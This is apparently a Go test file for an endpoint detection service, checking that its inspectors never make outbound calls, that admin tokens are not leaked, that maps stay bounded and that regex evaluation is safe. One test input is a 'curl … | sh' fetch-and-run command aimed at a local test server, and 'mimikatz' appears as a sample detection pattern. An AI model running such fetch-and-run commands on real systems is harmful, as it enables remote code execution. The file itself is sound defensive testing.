package edr

import (
	"net/http"
	"net/http/httptest"
	"sort"
	"strconv"
	"strings"
	"sync/atomic"
	"testing"
	"time"
)

// The URL/domain/email inspectors are static analysers: they must never make
// an outbound request, even when the input names a reachable host.
func TestInspectorsNeverFetch(t *testing.T) {
	var hits atomic.Int64
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { hits.Add(1) }))
	defer srv.Close()
	const token = "route-walk-secret-token"
	h := secTestHandler(t, token)
	host := strings.TrimPrefix(srv.URL, "http://")
	inputs := map[string]string{
		"url":    srv.URL + "/payload?x=1",
		"domain": strings.Split(host, ":")[0],
		"email":  "From: a@" + host + "\r\nSubject: hi\r\n\r\nclick " + srv.URL + "/track.gif <img src=\"" + srv.URL + "/p.png\">\r\n",
		"config": "url = " + srv.URL + "/c\n",
		"script": "curl " + srv.URL + "/x | sh\n",
	}
	for kind, body := range inputs {
		req := httptest.NewRequest("POST", "/v1/inspect/"+kind, strings.NewReader(body))
		req.RemoteAddr = nextAddr()
		req.Header.Set("Authorization", "Bearer "+token)
		rec := httptest.NewRecorder()
		h.ServeHTTP(rec, req)
		if rec.Code != 200 {
			t.Fatalf("%s: status %d: %s", kind, rec.Code, rec.Body.String())
		}
	}
	time.Sleep(200 * time.Millisecond)
	if n := hits.Load(); n != 0 {
		t.Fatalf("inspectors made %d outbound requests", n)
	}
}

// The admin token must never be reflected by any authenticated read endpoint.
func TestAdminTokenNeverInGETBodies(t *testing.T) {
	const token = "Zq9-unique-admin-secret-value-4417"
	h := secTestHandler(t, token)
	var leaks []string
	for r := range registeredRoutes(t) {
		parts := strings.SplitN(r, " ", 2)
		if parts[0] != "GET" || strings.Contains(parts[1], "stream") {
			continue
		}
		path := strings.ReplaceAll(parts[1], "{}", "x")
		req := httptest.NewRequest("GET", path, nil)
		req.RemoteAddr = nextAddr()
		req.Header.Set("Authorization", "Bearer "+token)
		rec := httptest.NewRecorder()
		h.ServeHTTP(rec, req)
		if strings.Contains(rec.Body.String(), token) {
			leaks = append(leaks, r)
		}
		for k, v := range rec.Header() {
			if strings.Contains(strings.Join(v, ""), token) {
				leaks = append(leaks, r+" header "+k)
			}
		}
	}
	sort.Strings(leaks)
	if len(leaks) > 0 {
		t.Fatalf("admin token reflected by: %v", leaks)
	}
}

// Unauthenticated probes of arbitrary paths/methods must not grow the metrics map.
func TestMetricsCardinalityBounded(t *testing.T) {
	m := NewMetrics()
	h := m.Middleware(http.NewServeMux())
	for i := 0; i < 500; i++ {
		req := httptest.NewRequest("GET", "/"+strconv.Itoa(i)+"/"+strconv.Itoa(i*7)+"/z", nil)
		h.ServeHTTP(httptest.NewRecorder(), req)
		req = httptest.NewRequest("PROPFIND"+strconv.Itoa(i%5), "/a/b/c", nil)
		h.ServeHTTP(httptest.NewRecorder(), req)
	}
	m.mu.Lock()
	n := len(m.requests)
	m.mu.Unlock()
	if n > 5 {
		t.Fatalf("metrics label set grew to %d from unauthenticated probes", n)
	}
}

func TestIOAPatternValidatedAndBounded(t *testing.T) {
	const token = "route-walk-secret-token"
	h := secTestHandler(t, token)
	post := func(body string) int {
		req := httptest.NewRequest("POST", "/v1/ioa", strings.NewReader(body))
		req.RemoteAddr = nextAddr()
		req.Header.Set("Authorization", "Bearer "+token)
		rec := httptest.NewRecorder()
		h.ServeHTTP(rec, req)
		return rec.Code
	}
	if c := post(`{"name":"bad","pattern":"(unclosed"}`); c != 400 {
		t.Errorf("invalid regex accepted: %d", c)
	}
	if c := post(`{"name":"big","pattern":"` + strings.Repeat("a", 600) + `"}`); c != 400 {
		t.Errorf("oversized regex accepted: %d", c)
	}
	if c := post(`{"name":"ok","pattern":"mimikatz"}`); c != 200 {
		t.Errorf("valid ioa rejected: %d", c)
	}
}

// RE2 guarantees linear time; confirm a classic catastrophic pattern is cheap
// through the hunt and lab rule paths on a large hostile input.
func TestUserRegexIsLinearTime(t *testing.T) {
	hostile := strings.Repeat("a", 200000) + "!"
	start := time.Now()
	re := ioaCompile(`(a+)+$`)
	if re == nil {
		t.Fatal("pattern should compile under RE2")
	}
	re.MatchString(hostile)
	if d := time.Since(start); d > 3*time.Second {
		t.Fatalf("regex took %v", d)
	}
	if _, serr := parseSeq(`process where command regex "(a+)+$"`); serr != nil {
		t.Logf("hunt regex syntax: %v", serr)
	}
}

func TestFileDetectionsHostMapBounded(t *testing.T) {
	d := &FileDetections{}
	now := time.Now()
	for i := 0; i < fileDetectMaxHosts+2000; i++ {
		d.Observe(FileEvent{Host: "h" + strconv.Itoa(i), Time: now, Path: "/tmp/x", Operation: "write"})
	}
	d.mu.Lock()
	n := len(d.counts)
	d.mu.Unlock()
	if n > fileDetectMaxHosts {
		t.Fatalf("per-host map grew to %d", n)
	}
}
